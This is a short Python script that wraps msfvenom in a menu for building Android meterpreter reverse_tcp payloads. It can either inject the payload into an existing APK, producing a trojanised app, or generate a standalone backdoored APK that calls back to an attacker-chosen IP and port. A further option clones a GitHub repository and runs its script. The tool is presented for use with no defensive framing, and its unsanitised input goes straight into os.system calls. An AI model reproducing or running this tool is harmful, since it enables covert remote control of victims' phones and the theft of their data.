import os

#COd

while True:
    print("[1] Inject Payload to Existing APK ")
    print("[2] Create a New APK ")
    print("[3] Create Another Payload")
    print("[4] Exit")

    bash = int(input("( main-menu ) : "))

    if bash == 1:
        print("\n")
        ipadd = input("IP Address : ")
        port= input("Port : ")
        targetapk = input("Target APK : ")
        targetlocation = input("Modified APK Name : ")
        print("\n")

        code = "msfvenom -x "+targetapk+" -p android/meterpreter/reverse_tcp LHOST="+ipadd+" LPORT="+port+" -o "+targetlocation
        os.system(code)

    if bash == 2 :
        print("\n")
        ipadd = input("IP Address : ")
        port= input("Port : ")
        targetlocation = input("APK Name : ")
        print("\n")

        code2 = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipadd+" LPORT="+port+" R > "+targetlocation

        os.system(code2)

    if bash == 3 :
        print("\n")
        os.system("git clone https://github.com/yatharthgeek/msfvenom-automation")
        os.system("cd msfvenom-automation")
        os.system("python3 msfvenom-automation.py")

    if bash == 4  :
        break


